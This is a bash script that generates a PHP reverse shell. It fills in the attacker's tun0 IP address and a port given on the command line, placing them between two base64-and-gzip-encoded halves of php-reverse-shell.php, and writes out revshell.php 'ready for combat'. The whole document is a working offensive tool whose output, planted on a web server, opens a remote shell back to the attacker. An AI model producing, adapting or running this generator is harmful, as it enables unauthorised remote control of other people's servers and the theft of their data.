#!/bin/bash
# pimpmy-phprevshell.sh
# php-reverse-shell.php generator
# command line usage : ./pimpmy-phprevshell.sh portnumber
#
# Generates a php-reverse-shell.php (revshell.php) with the port number supplied on the command line
# and ip address from which ever is defined in the interface="yourinterfacehere" variable
# by default this interface is set to tun0
#
# Output: revshell.php  with ipadress and port number in correct positions - ready for combat!
#
# Author : Dewalt
# Standard Disclaimer author assumes no liability for any damages
#

# Revision number
revision="0.2"

# To use for a different nic interface change interface="yourinterface"
interface="tun0"

# Commnad line paramter that you supply port number
port="$1"

# Get the ip address of $interace
ipaddress=$(sudo ifconfig $interface | grep -i inet | head -n 1 | cut -d " " -f 10)

# php-reverse-shell.php top of file before "$ip = "
filetop=$(base64 -d <<< "H4sIAAAAAAAAA+VY224bNxB911cMgj7YiK5OggJxi1ZxrViAYi90qeEng9qdlQhzyS3Jlau/75ld
WYmbJnXRFDZqPtjaXXJ4znDImcMffirXZavXI/zreN6wD9wJazaGOjSkafOGZvUbXZSGC7ZRRe0saUvJWSKDT1y59Xq1jnRwckhH/
f73VKIbh1g4e8Pbn+89dS1HjJKB87UOFJ0zVKgtLZmqwBnlzpPhlTJUVr50gQM5a7ZdokUAHIrqhimvgMhzKJ0NeqmNjluxKGOV3Z
JKBWMADo9XBaxWQdsVxbsZYW2+ZlJVXMuQNOUyBrKOjFb3zWWqUCumVNXgltt7NsY5HhkuiuyLQMozbMSdPbU0+OBo66q2dLNiMnN
1j0rG7A3t/DG2pEDLoa+vyXEKUHii98mEZC3E8UekytJoDm8/dWPp3cqrgvAz98wUXB5vgedYpgd6C4OZDtHrZRWZNEDarAd+hct0
XrPFu8pmmFpmbAi5vJn+fEHv2bLHoiTV0uiUJjplCxKfoAp1JMlnhNDOVUwjQTPboaGRwxR1AHW/gP4jyExiTEysXSneUlEg3mq4q
IkVBEFbTKAzXY7nZxeLOQ3Pr+hyOJ0Oz+dXx+iM9cVXBHJjSoJYwzLAeGXjFgzFwofT6ckZhgzfjSfj+RXBL6Px/Px0NqPRxRRbIR
lO5+OTxWQ4pWQxTS5mp1j9GQssFgNf8VBeOxncM45Km3BH/ArrEoDOZLRWG8b6pKw3wKYoxY56gO+VcXYlpoRmE047Rx6TziXO2nT
rdayj8Gtr0Ubopd02PekmRN8MwEHZG4PImEWwAcORzsF+ZJzzbXrnQhQ+H4bUPxoM+p3Bq/6AFrNh97HhP7wJ0WfRvn0OeGxGX2j/
NDU9KK08xSZE9+nur3PdY0P8Nu1Z7VHJVBKDbFNXeVRDmcRfYJshUxVSEoa2ZFbvNnWBGCR/hmq1QtFXx/oTjdZ7TYgWyKnx74rXx
wb6b9uzCt1fOKRel7Vi+d82Idr52B4bzn/X9gVDs6iNFiikFoC+QZ2/lIqW5icJziVruc60cvgoVNg+S12Gk2uciPKh0vn4dHNRQ7
TWBLrUOIH2smelRcooalS6r6yV4kE1MjGtvJfOyLieDlSp0rVUDr6ArNwePkW6z+owmuhCN7cn4U9btlbO3qXXULq2jk+IYFbFdeB
4vTQuvZFV9vxbpZGHk7Nkr7tfd1+9bEu+ffNSjKA8FuG4H22wCQ4OUTxTro1I0GbnONTQnmPlbSPU93Ojbx1pOZRqjaPpRaPhZHa6
ux641DZzt7WOhZhEzkQRUMJ6J2o8uLLJ+XXRypztqvlMMVKoDs3l0YHR2LRlaqNpYysG/fthcyMjqhYDPf4Y1MobwJB6904zLwKqj
73vagBQtOsYy7e93meZuicFZ+h9frkFcSy3Iisk8xCr9KbbaomjBf+1kUWig/7hceu7X0+ns/HFOf1ILwbd/ovjVusPYCI2BjITAA
A=" | gunzip )

# php-reverse-shell.php bottom of file after "$port = "
filebottom=$(base64 -d <<< "H4sIAAAAAAAAA61XbW/bNhD+7l9xMwxYBpwXZ/uUIB2KtB2CrU2RZMiHbTBoiYoIy6RGUnHdo
f99z5GSLbdqlrQzDNiS7vW5546nUVrUejl36qOkc5r9dHx8NhitrfJyLnBD12WJG9JaY7s3XCHLEpfjWouVpANxRuszUtkZHS2UPn
IFHagx5DIhV0ZDkM1mclHfx/+DoyN86VV4rJwkU1sny5xUTpVxTi1KSd6QeDAqo49mtVDSUSm8tKzKulWqfTnPjV2SclQIm5Ubkg/
SQkmoUsDClBa1p7VCqKIszZpqx0az1iubgWOqiooqa1LpHAmd7Xs9JLoz1hckyNvN4eHhADEmea1Tr4yeyw/KeZeMd+GMJxP6Z0DN
By7ecIxstxAPyKqQVAkrtd/6hA2/VRhV8H3eSS+ZAK/2KfuOEud0MOs6aj+VVdornwxfX19fXZ/ShdBjT2xoCEOfS7PrZNZ58OlLX
31egt7x5Cwk+D6mw/dcnyGIvBXLmHpa273cBTn8AEkqpchQ3o7SHVfOaNTV1WkqZcYhrWVIRmZ7cYI06sPcSe9Ulkyegg5TukWn1X
suQjt+z84Gn0iWYPLO59bX3cvrd5fvfjmlNyAmsuhyEPS6LUBgfP+u0XaUmhWbZL5og8IJL8pDDuxToP1FIfR97A1yIpeUKStTb+x
mkBb4nwyPWJhFr+EChBN6Q/VKuCVDp3QhubuzQbjFJdw2owkFstxDyCO0ONO96berSurtw9RoLUMDYBaYdAkEcv41EEpGqpqCxmga
/GB0aBN/nbdT+pE9csV+CIqTPrwaYbAvaO+VZVuOCMdNJdY6xtpSigeNS62qAIqrZIrYhLVik7CNYzp/0VwOK1XJ4ZSGdjiZBr45n
ynNlRDEzwCH8JG0hSqzOEgsWEq5NSu2Nuuxtu5YMxg/j5sLoxbVZGsn/daotQYwnmqNqzpqW+w8IDOPtQlQoR77GHG9YNSxXiiOcn
MrHYZjKpPW0KS3WHtjxu3K8VjRpA+TeuMLpe+Zy9rog0UJPuA6Ulc4o0/pKk15NmB6bwLyLuYZRKdsQwMCU98XwAfPV5gAJXhJHgG
4MO4LuaG1QWyDrYSft66SmPUfx39NiXn5iMjsv0VOHhNxIeLQblvobniqOZfXnB6XB7Nhr/0YGnTTaWim0NZrFFtSMvvsiLkoJJoQ
c5Ek5obJ6fbifbdJu6MylyaP8Uyecn7chEB2toCtXSmNozjrG5cL5L7sHZZ9Yd7cvrr6/bYnvBb0Z4TY0v074rsTylMN21gYwiDmK
YyW42gzA2Y3ZUQCzqxkV7WVRstXTde3awiOsCZRVsQ/hL07QpjWYbWKnd946LBuy65ONiNdr+ZpOAqyOWvgAIOJvSZIGtOw0Cx0cQ
zzJjcNi1x3sUAKl+FwTYXeDbkwYJhL0ccUJ6XOujoZjidmaQP+2HF+l+/2Kqr0fD+3GFdvacPOERbFya7MN1cXv9L165ev+go6Upo
BxwHEZrc+dnttj85XvZw25voc5QHF7siIsv2rwSN47mHVpT+P+UA1BjXwzafV19p4h2qHKs9GNtLyqdh2PH0DvsHXUxBuSvg/oNvt
tO9C9+Qb0UUAz0T35JvRha/vQhf45mlpXCODZ+1lS/kvbs2+vBXmVFg42tvN9hCX0t/UUsao49tZZvBih0U3bAJhvR9jZ92ux1n7Z
si6ySXXm99m1H1t+aXRU4HXOswfK+Me3A7akt0IJkOFN8JobjJo39pa2IAjRiY8d0sal9NG5WunDw0bzT/18DMMf35Bg38BTHZA/V
cPAAA=" | gunzip )

# if $ipaddress or $1 command line parameter are empty error and exit
if [ "$ipaddress" = "" ] || [ "$1" = "" ]
  then
    echo Error detecting interace ip address or command line port number  try again
    exit 0
  else
     # if ipaddress is not empty and $1 is not empty generated revshell.php
     echo -e "$filetop\n\$ip = '$ipaddress';\n\$port = '$1';\n$filebottom" > revshell.php
     echo -e "revshell.php generatred with "$ipaddress" and port "$1"  Happy Hacking!"
fi
